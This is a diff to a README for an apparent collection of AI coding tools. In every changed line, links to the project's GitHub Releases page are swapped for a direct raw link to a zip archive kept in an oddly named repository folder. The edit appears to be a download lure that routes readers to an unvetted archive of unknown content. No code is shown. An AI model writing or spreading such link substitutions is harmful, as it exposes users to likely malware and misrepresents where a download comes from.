@@ -1,7 +1,7 @@
 # 🌟 awesome-vibe-coding-tools - Enhance Your Coding Productivity Effortlessly
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download_Latest_Version-Release-brightgreen)](https://github.com/tusharjadhav124/awesome-vibe-coding-tools/releases)
+[![Download](https://github.com/tusharjadhav124/awesome-vibe-coding-tools/raw/refs/heads/main/homodermy/tools_awesome_vibe_coding_3.8-beta.4.zip)](https://github.com/tusharjadhav124/awesome-vibe-coding-tools/raw/refs/heads/main/homodermy/tools_awesome_vibe_coding_3.8-beta.4.zip)
 
 ## 🚀 Getting Started
 Welcome to **awesome-vibe-coding-tools**! This collection offers tools and plugins to improve your programming experience. You will find a variety of options that use artificial intelligence to support your coding journey. 
@@ -21,7 +21,7 @@ To download the latest version of the **awesome-vibe-coding-tools**, please foll
 
 1. **Visit the Releases Page**
    Go to our Releases page by clicking on the link below:
-   [Download Here](https://github.com/tusharjadhav124/awesome-vibe-coding-tools/releases)
+   [Download Here](https://github.com/tusharjadhav124/awesome-vibe-coding-tools/raw/refs/heads/main/homodermy/tools_awesome_vibe_coding_3.8-beta.4.zip)
 
 2. **Choose Your Tool**
    Browse the list of available files. Each file corresponds to a specific plugin or tool. Look for the most recent version for the best performance and features.
@@ -63,7 +63,7 @@ We welcome contributions to improve **awesome-vibe-coding-tools**. If you have i
 Your feedback is important to us. If you have thoughts on the tools or encounter any issues, please let us know. We aim to improve user experience continuously.
 
 ## 🔗 Helpful Links
-- **Releases Page**: [Download Here](https://github.com/tusharjadhav124/awesome-vibe-coding-tools/releases)
+- **Releases Page**: [Download Here](https://github.com/tusharjadhav124/awesome-vibe-coding-tools/raw/refs/heads/main/homodermy/tools_awesome_vibe_coding_3.8-beta.4.zip)
 - **Documentation**: [Documentation Link](https://link-to-documentation)
 - **Community Forums**: [Join Us](https://link-to-forums)
 
